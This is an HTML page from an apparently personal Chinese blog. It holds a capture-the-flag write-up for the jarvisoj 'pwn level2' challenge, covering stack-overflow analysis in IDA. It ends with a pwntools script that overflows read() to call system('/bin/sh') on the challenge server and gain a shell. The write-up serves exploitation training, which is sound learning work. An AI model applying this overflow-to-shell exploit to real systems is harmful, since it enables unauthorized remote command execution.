@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>jarvisoj pwn level2 wp | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.获取文件和链接，并且checksec检查文件的防护机制
+
+注意到NX保护开启了，并且是一个32位文件
+2.在ubuntu运行IDA*32的server文件，并且用IDA打开文件在debugger中进行相关设置后，开始远程调试
+
+
+
+
+
+..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">jarvisoj pwn level2 wp</h2>
+            <div class="post-date">2019-05-12</div>
+            
+            <div class="post-content" v-pre>
+              <p>1.获取文件和链接，并且checksec检查文件的防护机制<br>
+<img src="https://closefrom.github.io/post-images/1-2.png" alt="" loading="lazy"></p>
+<p>注意到NX保护开启了，并且是一个32位文件</p>
+<p>2.在ubuntu运行IDA*32的server文件，并且用IDA打开文件在debugger中进行相关设置后，开始远程调试<br>
+<img src="https://closefrom.github.io/post-images/3-2-300x41.png" alt="" loading="lazy"></p>
+<p><img src="https://closefrom.github.io/post-images/4-2-1024x615.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/5-2.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/6-2.png" alt="" loading="lazy"></p>
+<ol start="3">
+<li></li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/7-2-1024x468.png" alt="" loading="lazy"></figure>
+<p>找到main函数，f5进入，并且查看函数表，以及main函数c语言伪代码<br>
+<img src="https://closefrom.github.io/post-images/8-2.png" alt="" loading="lazy"></p>
+<p>跟进到vulnerable_function()并且查看，很明显，read函数处存在栈溢出</p>
+<ol start="4">
+<li></li>
+</ol>
+<p>可是system函数中没有参数“/bin/sh”</p>
+<p>则shift+f12 打开string窗口，一键找出所有的字符串<br>
+<img src="https://closefrom.github.io/post-images/9-2-1024x429.png" alt="" loading="lazy"></p>
+<p>可以发现 数据”/bin/sh”</p>
+<p>现在只需要构造system(“/bin/sh”)就可以getshell了</p>
+<ol start="5">
+<li></li>
+</ol>
+<p>首先，对system的参数和返回地址了解一下，如图：<br>
+<img src="https://closefrom.github.io/post-images/10-1-1024x474.png" alt="" loading="lazy"></p>
+<p>在main函数中的call vulnerable_function下断，f9运行程序到断点处：<br>
+<img src="https://closefrom.github.io/post-images/11-1-1024x364.png" alt="" loading="lazy"></p>
+<ol start="6">
+<li></li>
+</ol>
+<p>f7单步步入vulnerable_function<br>
+<img src="https://closefrom.github.io/post-images/12-1-1024x411.png" alt="" loading="lazy"></p>
+<p>可以看到，进入函数vulnerable_function后，对ebp（caller的栈帧保护）和esp（腾出栈空间）一番操作后，并且push offset command 将system函数的必要参数放入到了栈中，然后再f7跟进system函数。<br>
+<img src="https://closefrom.github.io/post-images/13-1-1024x414.png" alt="" loading="lazy"></p>
+<p>可以看到栈中数据从上到下为：caller(vulnerable_function)的下一条指令地址，还有system的字符串参数command （分析到此结束，此处不对system函数进行过多探究）</p>
+<ol start="7">
+<li></li>
+</ol>
+<p>那么vulnerable_function的功能是：</p>
+<p>（1）调用system函数，输出Input：</p>
+<p>（2）调用read函数，最多读入0x100字节，从0(buf)处开始写入到buf中</p>
+<p>现有的信息：</p>
+<pre class="wp-block-code"><code>（1）read函数处有栈溢出，
+（2）system函数的地址
+（3）字符串 "/bin/sh"的地址
+（4）system函数调用时的栈结构
+（5）栈为buf的读入腾出了0x88空间（从main函数的栈底地址处开始）</code></pre>
+<ol start="8">
+<li></li>
+</ol>
+<p>可以用这些信息，在read函数处，进行相应操作，下图所述：<br>
+<img src="https://closefrom.github.io/post-images/14-1.png" alt="" loading="lazy"></p>
+<p>9.开始写python exp：</p>
+<pre class="wp-block-code"><code>from pwn import *
+
+link = remote("pwn2.jarvisoj.com","9878")
+#连接目标主机
+context(arch = 'i386', os = 'linux', log_level = 'debug')
+#设置目标主机的信息
+elf_open = ELF("./l2")
+#ELF()获取当前路径（调用当前脚本的）l2文件的句柄
+system_address = elf_open.symbols["system"]
+#获取字符串的地址
+#获取l2文件中system函数的入口地址
+str_address = elf_open.search("/bin/sh").next()
+#也可以写成next(e.search("some_characters")) 
+#找到包含 some_characters（字符串，汇编代码或者某个数值）的地址。
+trash = "A"*(0x88+0x4)
+#无意义的数据
+test = 0xababaabb
+#此数据用于覆盖main函数中的栈底地址
+payload = trash + p32(system_address) + p32(test) + p32(str_address)
+#根据上图，构建出payload
+link.sendlineafter("Input:\n",payload)
+#在标准输出流获取到字符串Input：\n 后，发送payload并且换行
+link.interactive()
+#将控制权交给用户</code></pre>
+<ol start="10">
+<li></li>
+</ol>
+<p>将python exp和当前题目的文件（重命名为l2）放在同一目录下，运行python exp，然后cat flag</p>
+<figure data-type="image" tabindex="2"><img src="https://closefrom.github.io/post-images/15-2.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/pwntools库的学习/">
+                  <h3 class="post-title">
+                    pwntools库的学习
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
